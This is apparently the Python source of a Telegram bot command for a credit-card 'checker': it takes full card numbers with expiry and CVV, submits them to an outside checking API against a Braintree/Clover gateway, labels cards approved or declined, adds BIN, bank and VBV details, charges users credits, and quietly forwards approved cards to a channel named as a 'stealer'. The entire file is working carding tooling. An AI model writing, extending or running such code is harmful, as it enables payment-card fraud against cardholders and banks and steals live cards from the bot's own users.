import httpx
import time
import asyncio
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

STEALER_CHANNEL_ID = -1002549777556

async def forward_resp(fullcc, gateway, response):
    print(f"[FORWARD] {gateway} - {fullcc}: {response}")

async def refundcredit(user_id):
    print(f"[REFUND] Refund credit for user {user_id}")

async def result_logs(fullcc, gateway, result):
    print(f"[LOG] {gateway} - {fullcc}: {result}")

def map_braintree_response(api_data, user_id, fullcc):
    hits = "NO"
    status = "DECLINED❌"
    response = "Unknown Error ❌"
    try:
        # Map API response fields to your formatted strings
        response_status = api_data.get('status', '').lower()
        response_text = api_data.get('response', '') or api_data.get('message', '')
        is_approved = api_data.get('is_approved', False)

        if is_approved:
            status = "APPROVED✅"
            response = "Auth Succces"
            hits = "YES"
            asyncio.create_task(forward_resp(fullcc, "BRAINTREE AUTH", response))
        else:
            # Various decline mappings based on response text
            if "Status code cvv: Gateway Rejected: cvv" in response_text:
                status = "DECLINED❌"
                response = "Gateway Rejected: cvv ❌"
            elif "Declined - Call Issuer" in response_text:
                status = "DECLINED❌"
                response = "Declined - Call Issuer ❌"
            elif "2004: Expired Card (54 : EXPIRED CARD)" in response_text:
                status = "DECLINED❌"
                response = "2004: Expired Card ❌"
            elif "81724: Duplicate card exists in the vault." in response_text:
                status = "APPROVED✅"
                response = "Approved ✅"
                hits = "YES"
                asyncio.create_task(forward_resp(fullcc, "BRAINTREE AUTH", response))
            elif "Cannot Authorize at this time" in response_text:
                status = "DECLINED❌"
                response = "2106: Cannot Authorize at this time (Policy) ❌"
            elif "Status code 2014: Processor Declined - Fraud Suspected (51 : DECLINED)" in response_text:
                status = "DECLINED❌"
                response = "2014: Processor Declined - Fraud Suspected ❌"
            elif "risk_threshold: Gateway Rejected: risk_threshold" in response_text:
                status = "DECLINED❌"
                response = "Gateway Rejected: risk_threshold. ❌"
            elif ("We're sorry, but the payment validation failed. Declined - Call Issuer" in response_text or
                  "Payment failed: Declined - Call Issuer" in response_text):
                status = "DECLINED❌"
                response = "2044: Declined - Call Issuer ❌"
            elif "ProxyError" in response_text:
                status = "DECLINED❌"
                response = "Proxy Connection Refused ❌"
                asyncio.create_task(refundcredit(user_id))
            else:
                # Default fallback decline message
                if response_text:
                    response = response_text
                    if not response.endswith('❌'):
                        response += ' ❌'
                else:
                    response = "Declined ❌"
            hits = "NO"
        
        return {
            "status": status,
            "response": response,
            "hits": hits,
            "fullz": fullcc,
        }
    except Exception as e:
        return {
            "status": "DECLINED❌",
            "response": f"Error: {str(e)} ❌",
            "hits": "NO",
            "fullz": fullcc,
        }

@Client.on_message(filters.command("cl", [".", "/"]))
async def b3_check_cmd(Client, message):
    user_id = str(message.from_user.id)
    checkall = await check_all_thing(Client, message)
    gateway = "clover auth"

    if not checkall[0]:
        return

    role = checkall[1]
    getcc = await getmessage(message)
    if not getcc:
        resp = (f"""<b>Gate Name: {gateway} ♻️
CMD: /cl

Message: No CC Found in your input ❌

Usage: /cl cc|mes|ano|cvv</b>""")
        await message.reply_text(resp, message.id)
        return

    cc, mes, ano, cvv = getcc

    fullcc = f"{cc}|{mes}|{ano}|{cvv}"
    bin6 = cc[:6]

    firstresp = (f"""
↯ Checking.

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□
""")
    firstchk = await message.reply_text(firstresp, message.id)
    await asyncio.sleep(0.5)

    secondresp = (f"""
↯ Checking..

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■□
""")
    secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)
    await asyncio.sleep(0.5)

    start = time.perf_counter()
    session = httpx.AsyncClient(timeout=30, follow_redirects=True)

    try:
        resp = await session.get("https://b3-checker-production.up.railway.app/check", params={"card": fullcc})
        api_data = resp.json()
        print(f"[DEBUG] API parsed JSON: {api_data}")
    except Exception as e:
        api_data = {}
        print(f"[DEBUG] Exception calling API: {e}")

    mapped = map_braintree_response(api_data, user_id, fullcc)

    thirdresp = (f"""
↯ Checking...

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■■
""")
    thirdchk = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)
    await asyncio.sleep(0.5)

    getbin = await get_bin_details(cc)

    brand = getbin[0] if len(getbin) > 0 else "Unknown"
    type_ = getbin[1] if len(getbin) > 1 else "Unknown"
    level = getbin[2] if len(getbin) > 2 else "Unknown"
    bank = getbin[3] if len(getbin) > 3 else "Unknown"
    country = getbin[4] if len(getbin) > 4 else "Unknown"
    flag = getbin[5] if len(getbin) > 5 else ""
    currency = getbin[6] if len(getbin) > 6 else "Unknown"

    vbv_status = "Not Found"
    try:
        with open("FILES/vbvbin.txt", "r", encoding="utf-8") as file:
            vbv_data = file.readlines()
        bin_found = False
        for line in vbv_data:
            line = line.strip()
            if not line:
                continue
            parts = line.split('|')
            if parts[0] == bin6:
                bin_found = True
                vbv_status = parts[2] if len(parts) > 2 else parts[1]
                break
        if not bin_found:
            vbv_status = "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"
    except FileNotFoundError:
        vbv_status = "VBV BIN file missing"

    proxy_status = "Live ✨"

    finalresp = (f"""
{mapped['status']}
━━━━━━━━━━━━━
[㊕] 𝗖𝗖 - <code>{fullcc}</code>
[㊕] 𝗦𝘁𝗮𝘁𝘂𝘀 : {mapped['response']}
[㊕] 𝗚𝗮𝘁𝗲 - {gateway}
━━━━━━━━━━━━━
[㊕] 𝗩𝗕𝗩 - {vbv_status}
━━━━━━━━━━━━━
[㊕] B𝗶𝗻 : {bin6}
[㊕] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country} {flag}
[㊕] 𝗜𝘀𝘀𝘂𝗿 : {bank}
[㊕] 𝗧𝘆𝗽𝗲 : {brand} | {type_} - {level}
━━━━━━━━━━━━━
[㊕] T/t : {time.perf_counter() - start:0.2f}s | Proxy : {proxy_status}
[㊕] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆: <a href='tg://user?id={message.from_user.id}'> {message.from_user.first_name}</a> [ {role} ]
[㊕] 𝗢𝘄𝗻𝗲𝗿: <a href=\\"tg://user?id=6622603977\\">𝑵𝒂𝒊𝒓𝒐𝒃𝒊𝒂𝒏𝒈𝒐𝒐𝒏</a>
╚━━━━━━「𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐂𝐇𝐄𝐂𝐊𝐄𝐑」━━━━━━╝
""")

    await Client.edit_message_text(message.chat.id, thirdchk.id, finalresp)
    await setantispamtime(user_id)
    await deductcredit(user_id)
    if mapped["hits"] == "YES":
        await send_hit_if_approved(Client, finalresp)

    await session.aclose()
